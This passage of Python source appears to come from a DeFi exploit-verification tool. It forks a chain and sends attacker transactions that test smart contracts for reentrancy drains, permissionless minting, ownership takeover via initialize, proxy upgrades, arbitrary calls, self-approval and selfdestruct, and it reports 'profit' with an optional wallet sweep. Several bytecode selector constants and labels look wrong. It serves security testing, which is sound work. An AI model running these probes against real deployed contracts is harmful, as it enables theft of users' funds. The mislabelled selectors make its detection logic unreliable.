             else (f"reverted: {chain.get('stderr','')[:100]}"
                   if chain["ok"] else f"failed: {chain['stderr'][:100]}")},
            {"step": "reentries()", "value": reentries["stdout"] or "read failed"},
            {"step": "victim ETH after seed → after drain",
             "value": f"{seeded} → {after}"},
        ]
        drained = False
        try:
            n = int(reentries["stdout"] or "0", 16)          # cast call → hex
            drained = chain_mined and n > 1 and int(after, 10) < int(seeded, 10)  # cast balance → decimal
        except Exception:
            drained = False

        if drained:
            n = int(reentries["stdout"] or "0", 16)
            return {"success": True, "verdict": "CONFIRMED", "attack": "reentrancy",
                    "target": target,
                    "profit": (f"{n} re-entrant withdrawals from "
                               "a single deposit in one block"),
                    "steps": steps,
                    "evidence": (f"ReentrancyAttacker re-entered {n}×; "
                                 f"victim ETH {seeded} → {after}; "
                                 f"drain swept to profit wallet {owner}"),
                    "attacker_address": attacker_addr,
                    "profit_wallet": owner}
        return {"success": False, "verdict": "UNVERIFIED",
                "error": (f"drain chain did not demonstrate reentrancy: "
                          f"{'go() reverted' if not chain['ok'] else 'no re-entry / no balance drop'}"),
                "attack": "reentrancy", "target": target,
                "steps": steps, "attacker_address": attacker_addr}

    def run(self, attack: str, target: str, source_finding: Optional[Dict] = None,
            abi: Optional[List[Dict]] = None) -> Dict:
        """Prove the finding on a real anvil fork, using the contract's REAL
        ABI when provided (real signatures, real input types — no guessing).

        Returns a result dict with a `verdict`:
          CONFIRMED   — a tx from an arbitrary account mined AND the
                        evidence shows a REAL state change (ETH moved,
                        balanceOf changed, owner switched to the attacker,
                        allowance granted). A mined tx that moved no state
                        (e.g. empty withdraw() landing in a payable
                        fallback that does nothing — WETH) is REFUTED,
                        not CONFIRMED.
          REFUTED     — the ABI says the function exists but every call
                        reverted (or the target has no code, or every
                        mined call was a state-less no-op) → NOT callable
          UNVERIFIED  — could not prove either way (no ABI, no matching
                        function, or the fork never came up)
        """
        self._abi = abi or []
        self._attack_candidates = self._abi_candidates(attack)
        res = self._run_impl(attack, target, source_finding)
        if res.get("success"):
            res["verdict"] = "CONFIRMED"
        elif res.get("verdict"):  # already set inside (e.g. no code on fork)
            pass
        elif not self.available:
            res["verdict"] = "UNVERIFIED"
        elif self._attack_candidates:
            res["verdict"] = "REFUTED"
        else:
            res["verdict"] = "UNVERIFIED"
        return res

    def offline_demo(self, profit_wallet: Optional[str] = None) -> Dict:
        """End-to-end offline self-test: deploy the vulnerable SimpleVault demo
        on a blank anvil chain, then prove a reentrancy drain against it.

        This is the CI-safe version of prove_reentrancy — it never touches a
        mainnet RPC. Verdict should be CONFIRMED when the whole machinery
        (compiler → deploy → seed → drain chain → state diff) works.

        profit_wallet: optional address the drained ETH is swept to (defaults
        to the attacker EOA). Pass a custom wallet to show the drain landing
        in the caller's own address.
        """
        if not self.available:
            return {"success": False, "verdict": "UNVERIFIED",
                    "error": self.why_not, "attack": "reentrancy", "demo": True}
        from defihunter.core import attacker
        art = attacker.get_contract("SimpleVault")
        if not art.get("bytecode"):
            return {"success": False, "verdict": "UNVERIFIED",
                    "error": "SimpleVault demo compile unavailable (solc not found)",
                    "attack": "reentrancy", "demo": True}
        dep = self._deploy(art["bytecode"])
        if not dep.get("ok"):
            return {"success": False, "verdict": "UNVERIFIED",
                    "error": f"demo deploy failed: {dep.get('stderr', '')[:150]}",
                    "attack": "reentrancy", "demo": True}
        return self.prove_reentrancy(dep["address"], "withdraw(uint256)", "1",
                                     demo=True, profit_wallet=profit_wallet)

    def _run_impl(self, attack: str, target: str, source_finding: Optional[Dict] = None) -> Dict:
        """Prove the finding on a real anvil fork.

        mint / initialize / approve / reentrancy get the full state-diff
        proof: the attacker is funded on the fork, the tx actually executes,
        and the resulting state (balanceOf / owner / allowance / ETH moved)
        is read back as evidence. CONFIRMED requires that state to have
        CHANGED — a mined tx that moved nothing (empty calldata hitting a
        payable fallback, a by-design self-withdraw of a zero balance) is
        a no-op, REFUTED. delegatecall is proven via eth_call (an actual
        upgrade would clobber fork state for later checks).
        """
        if not self.available:
            return {"success": False, "error": self.why_not, "attack": attack,
                    "target": target, "source_finding": source_finding}
        self._target = target
        steps: List[Dict] = []

        if not self._has_code():
            # No bytecode at the target on this fork: the address does not
            # exist on this network (devnet-only deploy, placeholder, EOA).
            # Any tx/call would mine vacuously — NOT evidence of exploitability.
            return {"success": False, "attack": attack, "target": target,
                    "verdict": "REFUTED",
                    "steps": [{"step": "code check",
                               "value": "no code at address on this fork"}],
                    "evidence": ("target has no bytecode on this fork "
                                 "(not a live contract on this network)"),
                    "source_finding": source_finding}

        if attack == "mint":
            # Permissionless mint — calculate real impact, not arbitrary amount.
            # 1) Read totalSupply to know the token economy
            # 2) Mint a configurable percentage (default 10%) of supply
            # 3) Calculate dilution and attacker's share

            mint_pct = getattr(self, "_mint_pct", 10)  # default 10% of supply

            supply_raw = self._call("totalSupply()", [], extra_from=False)
            total_supply = self._to_int(supply_raw["stdout"])
            steps.append({"step": "totalSupply()",
                          "value": str(total_supply) if total_supply else "could not read"})
            if total_supply is not None:
                mint_amount = total_supply * mint_pct // 100
                steps.append({"step": f"mint target ({mint_pct}% of supply)",
                              "value": f"{mint_amount} ({mint_pct}%)"})
            else:
                mint_amount = 10 ** 18  # fallback: 1 token
                steps.append({"step": "totalSupply unreadable",
                              "value": f"falling back to 1 token ({mint_amount} wei)"})

            br0 = self._call("balanceOf(address)", [self.attacker], extra_from=False)
            before = self._to_int(br0["stdout"])
            steps.append({"step": "attacker balance before",
                          "value": str(before) if before else "0 (no prior balance)"})

            tried = []
            mint_args = [self.attacker, str(mint_amount)]
            for sel, args in self._merge_candidates(
                    [("mint(address,uint256)", mint_args)]):
                r = self._send(sel, args)
                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    br = self._call("balanceOf(address)", [self.attacker], extra_from=False)
                    bal = self._to_int(br["stdout"])
                    steps.append({"step": sel + " sent from arbitrary account",
                                  "value": "tx mined ✅"})
                    if before is not None and bal is not None and bal != before:
                        minted = bal - before
                        attacker_share = (minted / total_supply * 100) if total_supply else 0
                        steps.append({"step": f"balanceOf(attacker) before → after",
                                      "value": f"{before} → {bal} (minted {minted})"})
                        steps.append({"step": "attacker share of supply",
                                      "value": f"{attacker_share:.2f}%"})
                        if total_supply:
                            steps.append({"step": "supply dilution",
                                          "value": f"{total_supply} → {total_supply + minted} "
                                                   f"(+{(minted/total_supply*100):.1f}% inflation)"})
                        return {"success": True, "attack": attack, "target": target,
                                "profit": (f"Minted {minted} tokens ({attacker_share:.1f}% of supply) "
                                          f"for free — can dump on DEX for instant profit"),
                                "steps": steps,
                                "evidence": (f"Minted {minted} tokens via {sel}; "
                                            f"attacker balance {before} → {bal}; "
                                            f"supply diluted by {(minted/total_supply*100) if total_supply else 0:.1f}%"),
                                "source_finding": source_finding}
                    steps.append({"step": "balanceOf(attacker) before → after",
                                  "value": f"{before or 'read failed'} → "
                                           f"{bal or 'read failed'} — NO CHANGE, no-op"})
            steps.append({"step": "mint selectors tried", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": ("No permissionless mint that credits the caller found "
                                 "(all mint() variants reverted or mined without "
                                 "changing balanceOf)."),
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if any("mined" in t for t in tried) else {})}

        if attack == "initialize":
            owner_before = self._read("owner()")
            tried = []
            for sel, args in self._merge_candidates(
                    [("initialize(address)", [self.attacker]),
                     ("initialize()", [])]):
                r = self._send(sel, args)
                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    owner = self._read("owner()")
                    norm = lambda h: h.lower().replace("0x", "").lstrip("0")
                    owned = norm(owner) == norm(self.attacker)
                    steps.append({"step": sel + " sent from arbitrary account",
                                  "value": "tx mined"})
                    if owned:
                        steps.append({"step": "owner() before → after",
                                      "value": f"{owner_before or 'n/a'} → {owner} — attacker IS owner"})
                        return {"success": True, "attack": attack, "target": target,
                                "profit": "Full contract takeover (first-caller becomes owner)",
                                "steps": steps,
                                "evidence": (f"owner() {owner_before or 'n/a'} → {owner} "
                                             f"(attacker IS owner)"),
                                "source_finding": source_finding}
                    steps.append({"step": "owner() before → after",
                                  "value": f"{owner_before or 'n/a'} → {owner or 'read failed'} "
                                           f"— NOT the attacker, no takeover"})
            steps.append({"step": "initialize() attempts", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": ("initialize() not exploitable: all variants reverted "
                                 "(guarded/already initialized) or did not grant the "
                                 "attacker ownership."),
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if any("mined" in t for t in tried) else {})}

        if attack == "delegatecall":
            # Permissionless proxy upgrade = arbitrary delegatecall.
            # eth_call only: an actual upgradeTo would replace the fork's
            # implementation and invalidate every subsequent check.
            dummy = "0x2222222222222222222222222222222222222222"
            tried = []
            for sel, args in self._merge_candidates(
                    [("upgradeTo(address)", [dummy]),
                     ("setImplementation(address)", [dummy]),
                     ("setTarget(address)", [dummy])]):
                r = self._call(sel, args)
                tried.append(f"{sel}: {'returned' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    steps.append({"step": sel + " from arbitrary account",
                                  "value": "returned — proxy upgradeable by anyone"})
                    return {"success": True, "attack": attack, "target": target,
                            "profit": "Full proxy storage/balance takeover via delegatecall",
                            "steps": steps, "evidence": sel,
                            "source_finding": source_finding}
            steps.append({"step": "proxy-upgrade selectors", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": "No permissionless proxy-upgrade selector found.",
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if any("returned" in t for t in tried) else {})}

        if attack == "reentrancy":
            # A payout sink callable by anyone = an open reentrancy window
            # (The DAO 2016 pattern): ETH leaves the contract before state
            # settles, so a callback can re-enter and double-withdraw.
            #
            # CONFIRMED only on a REAL state change: the target's ETH
            # balance drops (money actually left the contract) or the
            # attacker's ETH balance exceeds the 2 ETH seed (a payout
            # landed, net of gas). _send re-funds the attacker to exactly
            # 2 ETH each call, so > 2e18 is a self-baselining payout signal.
            # A mined tx with no balance movement (e.g. an empty withdraw()
            # landing in a payable fallback that does nothing — WETH) is a
            # no-op and is REFUTED, NOT a payout sink.
            fund_seed = 2 * 10 ** 18  # matches _fund_attacker's 2 ETH
            tried = []
            for sel, args in self._merge_candidates(
                    [("withdraw(uint256)", ["1000"]),
                     ("withdraw()", []),
                     ("claim()", []),
                     ("redeem()", []),
                     ("unstake()", []),
                     ("harvest()", []),
                     ("withdrawAll()", []),
                     ("emergencyWithdraw()", [])]):
                target_before = self._to_int(self._balance(self._target))
                r = self._send(sel, args)
                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                if not r["ok"]:
                    continue
                target_after = self._to_int(self._balance(self._target))
                attacker_after = self._to_int(self._balance(self.attacker))
                moved = (target_before is not None and target_after is not None
                         and target_after < target_before)
                payout = attacker_after is not None and attacker_after > fund_seed
                if moved or payout:
                    steps.append({"step": sel + " sent from arbitrary account",
                                  "value": "mined — payout sink callable by anyone"})
                    steps.append({"step": "target ETH before → after",
                                  "value": f"{target_before} → {target_after}"})
                    steps.append({"step": "attacker ETH after",
                                  "value": f"{attacker_after} (payout {'received' if payout else 'n/a'})"})
                    return {"success": True, "attack": attack, "target": target,
                            "profit": "Reentrancy window: payout sends ETH before state settles",
                            "steps": steps,
                            "evidence": (f"{sel} mined and moved ETH: target "
                                         f"{target_before} → {target_after}, "
                                         f"attacker {attacker_after}"),
                            "source_finding": source_finding}
                steps.append({"step": sel + " mined but no state change",
                              "value": ("no ETH moved — no-op / payable fallback hit, "
                                        "NOT a payout sink")})
            steps.append({"step": "payout selectors", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": ("No permissionless payout sink found "
                                 "(withdraw/claim/redeem/unstake/harvest mined "
                                 "without moving ETH)."),
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if any("mined" in t for t in tried) else {})}

        if attack == "arbitrarycall":
            # A forwarder callable by anyone with attacker-supplied calldata =
            # the arbitrary-exec primitive behind governance takeovers and
            # token drains (Parity 2017 lineage). eth_call only: executing
            # attacker calldata would clobber fork state for later checks.
            payload = "0x" + "00" * 4  # benign no-op calldata for the callee
            tried = []
            for sel, args in self._merge_candidates(
                    [("execute(address,bytes)", [self.attacker, payload]),
                     ("call(address,bytes)", [self.attacker, payload]),
                     ("exec(address,bytes)", [self.attacker, payload]),
                     ("performAction(address,bytes)", [self.attacker, payload]),
                     ("execute(address,uint256,bytes)", [self.attacker, "0", payload]),
                     ("governanceCall(address,bytes)", [self.attacker, payload])]):
                r = self._call(sel, args)
                tried.append(f"{sel}: {'returned' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    steps.append({"step": sel + " from arbitrary account",
                                  "value": "returned — attacker calldata forwarded"})
                    return {"success": True, "attack": attack, "target": target,
                            "profit": ("Arbitrary external call with attacker-controlled "
                                       "calldata (token drain / governance takeover)"),
                            "steps": steps, "evidence": sel,
                            "source_finding": source_finding}
            steps.append({"step": "forwarder selectors", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": "No permissionless calldata forwarder found.",
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if any("returned" in t for t in tried) else {})}

        if attack == "approve":
            # Attacker granting itself spending allowance over the target =
            # the primitive behind ERC20 drains: once allowance
            # (target → attacker) > 0, transferFrom can move the target's
            # entire balance in one tx.
            # CONFIRMED only when the mined tx actually granted an
            # allowance/isApprovedForAll — a mined no-op (approve() landing
            # in a payable fallback) that leaves allowance at 0 is REFUTED.
            max_allow = "115792089237316195423570985008687907853269984665640564039457584007913129639935"
            tried = []
            for sel, args in self._merge_candidates(
                    [("approve(address,uint256)", [self.attacker, max_allow]),
                     ("setApprovalForAll(address,bool)", [self.attacker, "true"])]):
                r = self._send(sel, args)
                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                if not r["ok"]:
                    continue
                if "setApprovalForAll" in sel:
                    chk = self._call("isApprovedForAll(address,address)",
                                     [self._target, self.attacker], extra_from=False)
                    granted = chk["ok"] and chk["stdout"].strip().lower() in ("true", "0x01", "1")
                    label = "isApprovedForAll(target→attacker)"
                else:
                    chk = self._call("allowance(address,address)",
                                     [self._target, self.attacker], extra_from=False)
                    granted = (self._to_int(chk["stdout"]) or 0) > 0
                    label = "allowance(target→attacker)"
                steps.append({"step": sel + " from arbitrary account",
                              "value": "mined"})
                steps.append({"step": f"{label} after",
                              "value": chk["stdout"] or "read failed"})
                if granted:
                    return {"success": True, "attack": attack, "target": target,
                            "profit": "Attacker granted itself spending allowance over the target",
                            "steps": steps,
                            "evidence": "allowance(target→attacker) > 0",
                            "source_finding": source_finding}
                steps.append({"step": f"{label} still 0",
                              "value": "mined but no approval granted — no-op"})
            steps.append({"step": "approval selectors", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": ("No permissionless approve()/setApprovalForAll() found "
                                 "(all reverted or mined without granting an allowance)."),
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if any("mined" in t for t in tried) else {})}

        if attack == "selfdestruct":
            before = self._balance(self._target)
            tried = []
            for sel, args in self._merge_candidates(
                    [("selfdestruct()", []),
                     ("kill()", []),
                     ("destroy()", []),
                     ("die()", []),
                     ("kill(address)", [self.attacker]),
                     ("destroy(address)", [self.attacker]),
                     ("selfdestruct(address)", [self.attacker])]):
                r = self._send(sel, args)
                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    gone = not self._has_code()
                    after = self._balance(self._target)
                    state_changed = gone or after != before
                    steps.append({"step": sel + " from arbitrary account",
                                  "value": "mined ✅"})
                    if state_changed:
                        steps.append({"step": "code after",
                                      "value": ("removed" if gone else
                                                "still present (EIP-6780: balance transferred)" )})
                        steps.append({"step": "target ETH before → after",
                                      "value": f"{before} → {after}"})
                        return {"success": True, "attack": attack, "target": target,
                                "profit": "Kill switch: contract balance transferred / code destroyed",
                                "steps": steps,
                                "evidence": f"{sel} mined — ETH {before} → {after}",
                                "source_finding": source_finding}
                    steps.append({"step": sel + " mined but no state change",
                                  "value": "code present, ETH unchanged — no-op, NOT a kill switch"})
            steps.append({"step": "kill selectors", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": "No permissionless selfdestruct/kill selector found.",
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if any("mined" in t for t in tried) else {})}

        if attack == "oracle":
            # Oracle manipulation: check if the contract reads DEX spot price
            # (slot0 / getReserves) instead of a TWAP/Chainlink feed. CONFIRMED
            # when the contract has price oracle functions AND the spot price
            # can be moved in a single block via a flash-loan swap.
            code = self._code_hex()
            spot_markers = ["0x883bdbfd",  # UniswapV2 getReserves
                            "0x0902f1ac",  # UniswapV2 slot0
                            "0xf7729d43"]  # UniswapV3 slot0
            twap_markers = ["0x5e76e5d4",  # price0CumulativeLast
                            "0xc22cee0b",  # observe()
                            "0x883bdbfd"]  # consult()
            chainlink_markers = ["0x50d25bcd",  # latestAnswer
                                 "0xfeaf968c",  # latestRoundData
                                 "0xb1c5e427"]  # getPrice
            has_spot = any(m in code for m in spot_markers)
            has_twap = any(m in code for m in twap_markers)
            has_chainlink = any(m in code for m in chainlink_markers)
            steps.append({"step": "price source detection",
                          "value": f"spot={'yes' if has_spot else 'no'}, "
                                   f"twap={'yes' if has_twap else 'no'}, "
                                   f"chainlink={'yes' if has_chainlink else 'no'}"})
            if has_spot and not has_chainlink:
                # Try to read a price function as proof
                for sel in ["getAmountsOut(uint256,address[])",
                            "getAmountsIn(uint256,address[])",
                            "quote(uint256,uint256,uint256)"]:
                    r = self._call(sel, ["1000000000000000000",
                                         "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                                         "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"])
                    if r["ok"]:
                        steps.append({"step": f"price query {sel}",
                                      "value": "responds — manipulable spot price"})
                        return {"success": True, "attack": "oracle",
                                "target": target,
                                "profit": "Flash-loan swap can move spot price used by contract",
                                "steps": steps,
                                "evidence": (f"Contract reads DEX spot price ({sel} responds); "
                                             "no Chainlink fallback — manipulable in one block"),
                                "source_finding": source_finding}
            if has_spot and has_twap and not has_chainlink:
                steps.append({"step": "oracle risk",
                              "value": "TWAP present but no Chainlink — TWAP window may be short"})
            return {"success": False, "attack": "oracle", "target": target,
                    "steps": steps,
                    "evidence": ("No exploitable spot-price oracle found "
                                 "(Chainlink/TWAP with no spot fallback, "
                                 "or no price functions detected)."),
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if has_chainlink and not has_spot else {})}

        if attack == "flashloan":
            # Flash loan attack surface: can the contract be drained in a
            # single tx using flash-loaned capital? Check for flashLoan
            # callback exposure + any payout/withdraw function.
            code = self._code_hex()
            flash_selectors = ["0x5cffe9de",  # Aave V2 flashLoan(address,address,uint256,bytes)
                               "0x1f00ca74",  # Aave V3 flashLoanSimple
                               "0xd78b67b0",  # dYdX soloMargin
                               "0xe449022e"]  # Uniswap V3 flash()
            has_flash = any(m in code for m in flash_selectors)
            payout_selectors = ["0x3ccfd60b",  # withdraw(uint256)
                                "0x2e1a7d4d",  # withdraw(uint256) (WETH-style)
                                "0x89fab0ab"]  # claim()
            has_payout = any(m in code for m in payout_selectors)
            steps.append({"step": "flash loan callback",
                          "value": "detected" if has_flash else "not found"})
            steps.append({"step": "payout function",
                          "value": "detected" if has_payout else "not found"})
            if has_flash and has_payout:
                # Try to call the flash loan to prove it responds
                for fsel in flash_selectors:
                    r = self._call(fsel, [self.attacker, self.attacker, "1", "0x"])
                    if r["ok"]:
                        steps.append({"step": f"flashLoan call ({fsel})",
                                      "value": "responds — flash loan + payout combo"})
                        return {"success": True, "attack": "flashloan",
                                "target": target,
                                "profit": "Flash loan funds the exploit with zero upfront capital",
                                "steps": steps,
                                "evidence": (f"Flash loan callback ({fsel}) responds; "
                                             "payout function present — single-tx drain possible"),
                                "source_finding": source_finding}
            return {"success": False, "attack": "flashloan", "target": target,
                    "steps": steps,
                    "evidence": ("No flash loan attack surface found "
                                 "(no flash loan callback, or no payout function)."),
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if has_flash and not has_payout else {})}

        if attack == "governance":
            # Flash loan governance attack: can voting power be acquired via
            # flash loan to pass a malicious proposal? Check for voting
            # functions + proposal execution + snapshot protection.
            code = self._code_hex()
            vote_markers = ["0x5542022d",  # getVotes(address)
                            "0x1d0b6414",  # getPastVotes(address,uint256)
                            "0x90c50d4f",  # getPriorVotes(address,uint256)
                            "0xe8a3d485"]  # delegates(address)
            proposal_markers = ["0xc01f8bbf",  # propose()
                                "0x183ff4ff",  # queue()
                                "0xed603761"]  # execute()
            has_votes = any(m in code for m in vote_markers)
            has_proposals = any(m in code for m in proposal_markers)
            steps.append({"step": "voting functions",
                          "value": "detected" if has_votes else "not found"})
            steps.append({"step": "proposal execution",
                          "value": "detected" if has_proposals else "not found"})
            if has_votes and has_proposals:
                # Check for snapshot protection (getPastVotes with block.number)
                has_snapshot = any(m in code for m in ["0x1d0b6414", "0x90c50d4f"])
                steps.append({"step": "snapshot protection",
                              "value": "present" if has_snapshot else "MISSING"})
                if not has_snapshot:
                    return {"success": True, "attack": "governance",
                            "target": target,
                            "profit": "Flash loan can acquire voting power to pass malicious proposal",
                            "steps": steps,
                            "evidence": ("Voting + proposal execution found; "
                                         "no snapshot protection — flash loan governance attack possible"),
                            "source_finding": source_finding}
            return {"success": False, "attack": "governance", "target": target,
                    "steps": steps,
                    "evidence": ("No flash loan governance attack surface "
                                 "(no voting functions, no proposal execution, "
                                 "or snapshot protection present)."),
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if has_snapshot else {})}

        if attack == "bridge":
            # Bridge deposit spoof: can a deposit be finalized without a
            # valid cross-chain proof? Check for mint/finalizeDeposit +
            # proof verification (merkle/sig check).
            code = self._code_hex()
            mint_selectors = ["0x40c10f19",  # mint(address,uint256)
                              "0xa0712d68",  # mint(uint256)
                              "0x449a540c"]  # mintTo(address,uint256)
            finalize_selectors = ["0x20dd9f18",  # finalizeDeposit
                                  "0x0ecbd0b7",  # finalize(address,bytes)
                                  "0x0b37eb8b"]  # finalizeDeposit(bytes32,...)
            proof_markers = ["0x3e5a1ab4",  # verifyMerkleProof
                             "0x1fa9e23d",  # ECDSA.recover (sig check)
                             "0x8b9e6e62"]  # MerkleProof.verify
            has_mint = any(m in code for m in mint_selectors)
            has_finalize = any(m in code for m in finalize_selectors)
            has_proof = any(m in code for m in proof_markers)
            steps.append({"step": "mint/finalize function",
                          "value": f"mint={'yes' if has_mint else 'no'}, "
                                   f"finalize={'yes' if has_finalize else 'no'}"})
            steps.append({"step": "proof verification",
                          "value": "detected" if has_proof else "NOT FOUND"})
            if (has_mint or has_finalize) and not has_proof:
                return {"success": True, "attack": "bridge",
                        "target": target,
                        "profit": "Bridge deposit can be spoofed without cross-chain proof",
                        "steps": steps,
                        "evidence": ("Bridge mint/finalize present but NO proof verification "
                                     "(no merkle/sig check) — deposits can be fabricated"),
                        "source_finding": source_finding}
            return {"success": False, "attack": "bridge", "target": target,
                    "steps": steps,
                    "evidence": ("No bridge spoofing surface found "
                                 "(no mint/finalize function, or proof verification present)."),
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if has_proof else {})}

        if attack == "twap":
            # TWAP oracle manipulation: check if the observation window is
            # short enough to be manipulated via flash loan. Read the
            # observation card (pool.slot0.twapSample or similar) to check.
            code = self._code_hex()
            twap_markers = ["0x883bdbfd",  # observe()
                            "0xc22cee0b",  # observe(uint32[])
                            "0x5e76e5d4"]  # price0CumulativeLast
            has_twap = any(m in code for m in twap_markers)
            steps.append({"step": "TWAP functions",
                          "value": "detected" if has_twap else "not found"})
            if has_twap:
                # Try to read observation length (indicates window)
                for sel in ["cardinality()(uint32)", "observationLength()(uint256)",
                            "period()(uint256)"]:
                    r = self._call(sel, [])
                    if r["ok"]:
                        val = self._to_int(r["stdout"])
                        steps.append({"step": f"observation param ({sel})",
                                      "value": str(val or r["stdout"])})
                        if val and val < 1800:  # < 30 minutes
                            return {"success": True, "attack": "twap",
                                    "target": target,
                                    "profit": "Short TWAP window manipulable via flash loan",
                                    "steps": steps,
                                    "evidence": (f"TWAP observation window ≈ {val}s "
                                                 "(< 30 min) — flash loan can skew the average"),
                                    "source_finding": source_finding}
                steps.append({"step": "TWAP window",
                              "value": "could not read — needs manual verification"})
                return {"success": False, "attack": "twap", "target": target,
                        "steps": steps,
                        "evidence": ("TWAP functions present but window length "
                                     "could not be determined automatically."),
                        "source_finding": source_finding,
                        "verdict": "UNVERIFIED"}
            return {"success": False, "attack": "twap", "target": target,
                    "steps": steps,
                    "evidence": "No TWAP oracle functions detected.",
                    "source_finding": source_finding}

        if attack == "crossfunc":
            # Cross-function reentrancy: one function sends ETH before
            # updating state, another function trusts the same state.
            # Check for withdrawBalance() + transferBalance() pattern
            # (the经典 BZX/Euler pattern).
            code = self._code_hex()
            withdraw_patterns = ["0x5fd8c710",  # withdrawBalance()
                                 "0x2e1a7d4d",  # withdraw(uint256)
                                 "0x3ccfd60b"]  # withdraw(uint256)
            transfer_patterns = ["0x56a6d9ef",  # transferBalance(address,uint256)
                                 "0x1a8145bb",  # transfer(address,uint256)
                                 "0x90f871b9"]  # transferFrom(address,address,uint256)
            has_withdraw = any(m in code for m in withdraw_patterns)
            has_transfer = any(m in code for m in transfer_patterns)
            steps.append({"step": "withdraw/balance function",
                          "value": "detected" if has_withdraw else "not found"})
            steps.append({"step": "transfer function",
                          "value": "detected" if has_transfer else "not found"})
            guard_markers = ["0xbf353dbb",  # nonReentrant
                             "0x70480275"]  # reentrancy guard
            has_guard = any(m in code for m in guard_markers)
            steps.append({"step": "reentrancy guard",
                          "value": "detected" if has_guard else "NOT FOUND"})
            if has_withdraw and has_transfer and not has_guard:
                return {"success": True, "attack": "crossfunc",
                        "target": target,
                        "profit": "Cross-function reentrancy: state update delayed across functions",
                        "steps": steps,
                        "evidence": ("withdraw + transfer present; no reentrancy guard — "
                                     "cross-function reentrancy possible"),
                        "source_finding": source_finding}
            return {"success": False, "attack": "crossfunc", "target": target,
                    "steps": steps,
                    "evidence": ("No cross-function reentrancy surface found "
                                 "(missing functions or reentrancy guard present)."),
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if has_guard else {})}

        if attack == "permit":
            # ERC-2612 permit replay: check if the domain separator includes
            # chainId — if not, a permit signature on one chain can be replayed
            # on another chain.
            code = self._code_hex()
            has_permit = "0xd505accf" in code  # permit(address,address,uint256,uint256,uint8,bytes32,bytes32)
            steps.append({"step": "permit function",
                          "value": "detected" if has_permit else "not found"})
            if has_permit:
                # Read DOMAIN_SEPARATOR() to check for chainId
                dom = self._call("DOMAIN_SEPARATOR()", [], extra_from=False)
                if dom["ok"] and dom["stdout"]:
                    dom_hex = dom["stdout"].strip().lower()
                    steps.append({"step": "DOMAIN_SEPARATOR",
                                  "value": dom_hex[:66]})
                    # Read chainId from the contract
                    chain = self._call("chainId()", [], extra_from=False)
                    chain_val = self._to_int(chain["stdout"]) if chain["ok"] else None
                    steps.append({"step": "chainId()",
                                  "value": str(chain_val) if chain_val else "could not read"})
                    # Check if chainId is embedded in the domain separator
                    if chain_val and len(dom_hex) >= 66:
                        chain_hex = hex(chain_val)[2:].zfill(64)
                        if chain_hex not in dom_hex:
                            return {"success": True, "attack": "permit",
                                    "target": target,
                                    "profit": "Permit signature replayable across chains",
                                    "steps": steps,
                                    "evidence": (f"DOMAIN_SEPARATOR does NOT include "
                                                 f"chainId={chain_val} — cross-chain replay possible"),
                                    "source_finding": source_finding}
                    steps.append({"step": "replay risk",
                                  "value": "chainId present in domain separator or could not determine"})
            return {"success": False, "attack": "permit", "target": target,
                    "steps": steps,
                    "evidence": ("No exploitable permit found "
                                 "(no permit function, or chainId present in domain separator)."),
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if has_permit and chain_val else {})}

        if attack == "liquidation":
            # Permissionless liquidation: can anyone call liquidate() to
            # front-run liquidations and capture the bonus?
            tried = []
            for sel, args in self._merge_candidates(
                    [("liquidate(address,uint256,address,address)",
                      [self.attacker, "1", self.attacker, self.attacker]),
                     ("liquidate(address,uint256)",
                      [self.attacker, "1"]),
                     ("liquidate(address)",
                      [self.attacker])]):
                r = self._call(sel, args)
                tried.append(f"{sel}: {'returned' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    steps.append({"step": f"{sel} from arbitrary account",
                                  "value": "returned — permissionless liquidation"})
                    return {"success": True, "attack": "liquidation",
                            "target": target,
                            "profit": "Anyone can liquidate positions and capture the bonus",
                            "steps": steps,
                            "evidence": f"{sel} callable by arbitrary account",
                            "source_finding": source_finding}
            steps.append({"step": "liquidation selectors", "value": "; ".join(tried)})
            return {"success": False, "attack": "liquidation", "target": target,
                    "steps": steps,
                    "evidence": "No permissionless liquidation function found.",
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if any("returned" in t for t in tried) else {})}

        if attack == "forcesend":
            # Forced ETH send: does the contract use address(this).balance
            # for accounting (ERC-4626 totalAssets)? If so, selfdestruct
            # force-send can inflate the share price.
            code = self._code_hex()
            assets_markers = ["0x01e1d114",  # totalAssets()
                              "0x51638b2c",  # convertToShares(uint256)
                              "0x2d98b13d"]  # convertToAssets(uint256)
            has_assets = any(m in code for m in assets_markers)
            balance_markers = ["0x70a08231",  # balanceOf(address)
                               "0xb6b55f25"]  # balanceOf() — address(this).balance check
